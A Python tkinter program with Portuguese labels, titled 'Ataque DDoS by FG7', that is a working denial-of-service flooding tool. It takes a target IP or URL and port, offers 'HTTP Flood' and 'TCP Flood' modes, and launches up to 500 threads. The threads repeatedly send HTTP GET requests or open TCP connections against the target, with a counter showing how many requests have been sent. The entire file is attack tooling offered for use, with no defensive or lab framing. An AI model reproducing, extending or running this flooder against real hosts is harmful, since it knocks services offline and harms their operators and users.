import tkinter as tk
from tkinter import scrolledtext, messagebox, simpledialog
import threading
import requests
import time
import socket
import re
from urllib.parse import urlparse

class ConfigDialog(simpledialog.Dialog):
    def __init__(self, parent, timeout, threads, modo):
        self.timeout = timeout
        self.threads = threads
        self.modo = modo
        super().__init__(parent, title="Configurações")

    def body(self, frame):
        tk.Label(frame, text="Timeout (segundos):").grid(row=0, column=0, sticky="w")
        self.entry_timeout = tk.Entry(frame, width=10)
        self.entry_timeout.grid(row=0, column=1)
        self.entry_timeout.insert(0, str(self.timeout))

        tk.Label(frame, text="Número de Threads:").grid(row=1, column=0, sticky="w")
        self.entry_threads = tk.Entry(frame, width=10)
        self.entry_threads.grid(row=1, column=1)
        self.entry_threads.insert(0, str(self.threads))

        tk.Label(frame, text="Modo de Ataque:").grid(row=2, column=0, sticky="w")
        self.modo_var = tk.StringVar(value=self.modo)
        tk.Radiobutton(frame, text="HTTP Flood", variable=self.modo_var, value="http").grid(row=2, column=1, sticky="w")
        tk.Radiobutton(frame, text="TCP Flood", variable=self.modo_var, value="tcp").grid(row=3, column=1, sticky="w")

        return self.entry_timeout  

    def validate(self):
        try:
            timeout = float(self.entry_timeout.get())
            if timeout <= 0:
                raise ValueError
        except ValueError:
            messagebox.showerror("Erro", "Timeout deve ser um número positivo.")
            return False

        try:
            threads = int(self.entry_threads.get())
            if threads <= 0 or threads > 500:
                raise ValueError
        except ValueError:
            messagebox.showerror("Erro", "Número de threads deve ser inteiro entre 1 e 500.")
            return False

        self.timeout = timeout
        self.threads = threads
        self.modo = self.modo_var.get()
        return True

    def apply(self):
        pass

class AtaqueApp:
    def __init__(self, root):
        self.root = root
        root.title("Ataque DDoS by FG7 - O Poder Total")
        root.configure(bg="#222222")
        root.geometry("750x600")
        root.resizable(False, False)

        self.timeout = 5.0
        self.threads = 50
        self.modo = "http"  

        self.bg_color = "#222222"
        self.fg_color = "#f0f0f0"
        self.entry_bg = "#333333"
        self.btn_bg = "#444444"
        self.btn_fg = "#f0f0f0"
        self.btn_active_bg = "#666666"
        self.log_bg = "#1a1a1a"
        self.log_fg = "#cfcfcf"
        self.font_label = ("Segoe UI", 11)
        self.font_entry = ("Consolas", 12)

        frame = tk.Frame(root, bg=self.bg_color)
        frame.pack(fill="both", expand=True, padx=20, pady=15)

        tk.Label(frame, text="IP ou URL alvo:", fg=self.fg_color, bg=self.bg_color, font=self.font_label).grid(row=0, column=0, sticky="w", pady=(0,5))
        self.entry_alvo = tk.Entry(frame, width=40, bg=self.entry_bg, fg=self.fg_color, insertbackground=self.fg_color, font=self.font_entry, relief="flat")
        self.entry_alvo.grid(row=1, column=0, sticky="w")

        tk.Label(frame, text="Porta (opcional):", fg=self.fg_color, bg=self.bg_color, font=self.font_label).grid(row=0, column=1, sticky="w", padx=(15,0), pady=(0,5))
        self.entry_porta = tk.Entry(frame, width=10, bg=self.entry_bg, fg=self.fg_color, insertbackground=self.fg_color, font=self.font_entry, relief="flat")
        self.entry_porta.grid(row=1, column=1, sticky="w", padx=(15,0))

        self.botao_ataque = tk.Button(frame, text="Iniciar Ataque", command=self.iniciar_ataque,
                                     bg=self.btn_bg, fg=self.btn_fg, activebackground=self.btn_active_bg,
                                     relief="flat", padx=18, pady=10, font=self.font_label, cursor="hand2")
        self.botao_ataque.grid(row=1, column=2, padx=(15,0))

        self.botao_limpar = tk.Button(frame, text="Limpar Log", command=self.limpar_log,
                                     bg=self.btn_bg, fg=self.btn_fg, activebackground=self.btn_active_bg,
                                     relief="flat", padx=18, pady=10, font=self.font_label, cursor="hand2")
        self.botao_limpar.grid(row=2, column=2, padx=(15,0), pady=(10,0))

        self.botao_config = tk.Button(frame, text="Configurações", command=self.abrir_configuracoes,
                                     bg=self.btn_bg, fg=self.btn_fg, activebackground=self.btn_active_bg,
                                     relief="flat", padx=18, pady=10, font=self.font_label, cursor="hand2")
        self.botao_config.grid(row=2, column=1, padx=(15,0), pady=(10,0))

        tk.Label(frame, text="Log dos Ataques:", fg=self.fg_color, bg=self.bg_color, font=self.font_label).grid(row=3, column=0, sticky="w", pady=(15,0))

        self.log = scrolledtext.ScrolledText(frame, width=90, height=24, bg=self.log_bg, fg=self.log_fg,
                                             state='disabled', font=("Consolas", 10), relief="flat", wrap="word")
        self.log.grid(row=4, column=0, columnspan=3, pady=(5,0))

        self.label_count = tk.Label(frame, text="Requisições/enviadas: 0", fg=self.fg_color, bg=self.bg_color, font=self.font_label)
        self.label_count.grid(row=5, column=0, sticky="w", pady=(10,0))

        self.atacando = False
        self.req_enviadas = 0
        self.threads_list = []
        self.log_timeout_shown = False

    def abrir_configuracoes(self):
        dialog = ConfigDialog(self.root, self.timeout, self.threads, self.modo)
        if dialog.result is not None:
            self.timeout = dialog.timeout
            self.threads = dialog.threads
            self.modo = dialog.modo
            self.log_msg(f"[Config] Timeout={self.timeout}s, Threads={self.threads}, Modo={self.modo.upper()}")

    def log_msg(self, msg):
        self.log.configure(state='normal')
        self.log.insert(tk.END, msg + "\n")
        self.log.see(tk.END)
        self.log.configure(state='disabled')

    def limpar_log(self):
        self.log.configure(state='normal')
        self.log.delete(1.0, tk.END)
        self.log.configure(state='disabled')

    def porta_aberta(self, host, porta, timeout=3):
        try:
            with socket.create_connection((host, porta), timeout=timeout):
                return True
        except Exception as e:
            self.log_msg(f"[DEBUG] Falha ao conectar em {host}:{porta} - {e}")
            return False


    def validar_ip(self, ip):
        regex = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
        if re.match(regex, ip):
            partes = ip.split('.')
            return all(0 <= int(p) <= 255 for p in partes)
        return False

    def validar_url(self, url):
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except:
            return False

    def ataque_http_thread(self, alvo):
        while self.atacando:
            try:
                r = requests.get(alvo, timeout=self.timeout)
                self.req_enviadas += 1
                self.root.after(0, lambda: self.label_count.config(text=f"Requisições/enviadas: {self.req_enviadas}"))
                self.log_msg(f"Resposta HTTP: {r.status_code}")
            except requests.exceptions.ConnectTimeout:
                if not self.log_timeout_shown:
                    self.log_msg(f"[Timeout] Falha na conexão (timeout={self.timeout}s)")
                    self.log_timeout_shown = True
            except Exception as e:
                self.log_msg(f"[Erro] {e}")
            time.sleep(0.05)

    def ataque_tcp_thread(self, host, porta):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        while self.atacando:
            try:
                sock.connect((host, porta))
                sock.send(b"GET / HTTP/1.1\r\nHost: "+ host.encode() + b"\r\n\r\n")
                self.req_enviadas += 1
                self.root.after(0, lambda: self.label_count.config(text=f"Pacotes TCP enviados: {self.req_enviadas}"))
                self.log_msg(f"Pacote TCP enviado para {host}:{porta}")
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
            except Exception as e:
                if not self.log_timeout_shown:
                    self.log_msg(f"[Erro TCP] {e}")
                    self.log_timeout_shown = True
            time.sleep(0.01)

    def iniciar_ataque(self):
        if self.atacando:
            self.atacando = False
            self.botao_ataque.config(text="Iniciar Ataque")
            self.log_msg("Parando ataque... Aguarde finalização das threads.")
            self.threads_list.clear()
            self.log_timeout_shown = False
            self.req_enviadas = 0
            self.label_count.config(text="Requisições/enviadas: 0")
            self.log_msg("Ataque finalizado.")
            return

        alvo = self.entry_alvo.get().strip()
        porta = self.entry_porta.get().strip()

        if not alvo:
            messagebox.showwarning("Aviso", "Por favor, insira um IP ou URL válido.")
            return

        if porta:
            if not porta.isdigit() or not (1 <= int(porta) <= 65535):
                messagebox.showwarning("Aviso", "Porta inválida. Insira um número entre 1 e 65535.")
                return

        if not (alvo.startswith("http://") or alvo.startswith("https://")):
            alvo_temp = "http://" + alvo
        else:
            alvo_temp = alvo

        if porta:
            parsed = urlparse(alvo_temp)
            netloc = parsed.hostname + ":" + porta
            alvo_temp = parsed._replace(netloc=netloc).geturl()

        if not (self.validar_ip(alvo) or self.validar_url(alvo_temp)):
            messagebox.showwarning("Aviso", "IP ou URL inválido.")
            return

        parsed = urlparse(alvo_temp)
        host = parsed.hostname
        port = parsed.port if parsed.port else (443 if parsed.scheme == 'https' else 80)

        self.log_msg(f"Testando conexão em {host}:{port} ...")
        self.root.update()

        if not self.porta_aberta(host, port, timeout=3):
            self.log_msg(f"[Erro] Porta {port} no host {host} está fechada ou inacessível.")
            messagebox.showerror("Erro", f"Não foi possível conectar em {host}:{port}. Porta fechada ou host inacessível.")
            return

        self.atacando = True
        self.req_enviadas = 0
        self.label_count.config(text="Requisições/enviadas: 0")
        self.botao_ataque.config(text="Parar Ataque")
        self.limpar_log()
        self.log_msg(f"Iniciando ataque no modo {self.modo.upper()} contra {host}:{port} com {self.threads} threads e timeout {self.timeout}s...")

        for _ in range(self.threads):
            if self.modo == "http":
                t = threading.Thread(target=self.ataque_http_thread, args=(alvo_temp,), daemon=True)
            else:
                t = threading.Thread(target=self.ataque_tcp_thread, args=(host, port), daemon=True)
            t.start()
            self.threads_list.append(t)


if __name__ == "__main__":
    root = tk.Tk()
    app = AtaqueApp(root)
    root.mainloop()
